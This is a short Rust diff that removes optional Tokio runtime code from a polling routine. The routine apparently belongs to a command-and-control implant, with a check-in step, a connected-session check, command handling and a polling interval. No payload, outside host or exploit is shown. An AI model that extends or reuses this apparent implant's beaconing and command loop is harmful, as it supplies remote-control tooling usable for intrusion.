@@ -21,9 +21,6 @@ static GLOBAL: NtAllocator = NtAllocator;
 use init::{init_checkin_data, init_protocol};
 use mod_agentcore::instance;
 
-#[cfg(feature = "tokio-runtime")]
-use mod_tokio_runtime::TokioRuntimeWrapper;
-
 #[cfg(feature = "std-runtime")]
 use mod_std_runtime::CustomRuntime;
 
@@ -31,16 +28,6 @@ use rs2_runtime::Runtime;
 
 /// Main routine that initializes the runtime and repeatedly checks the connection status.
 pub fn routine() {
-    // let rt = Arc::new(
-    //     Builder::new_multi_thread()
-    //         .worker_threads(4)
-    //         .enable_all()
-    //         .build()
-    //         .unwrap(),
-    // );
-    #[cfg(feature = "tokio-runtime")]
-    let rt = Arc::new(TokioRuntimeWrapper::new(4));
-
     #[cfg(feature = "std-runtime")]
     let rt = Arc::new(CustomRuntime::new(4));
 
@@ -54,18 +41,6 @@ pub fn routine() {
             if instance().session.connected {
                 // If connected, handle incoming commands
                 command_handler(rt.clone());
-            }
-
-            #[cfg(feature = "tokio-runtime")]
-            {
-                // Sleep for 15 seconds before checking again, ensuring all tasks are done.
-                libc_println!("Sleep: {}", instance().config.polling_interval);
-                rt.block_on(async {
-                    tokio::time::sleep(Duration::from_secs(
-                        instance().config.polling_interval as u64,
-                    ))
-                    .await;
-                });
             }
 
             #[cfg(feature = "std-runtime")]
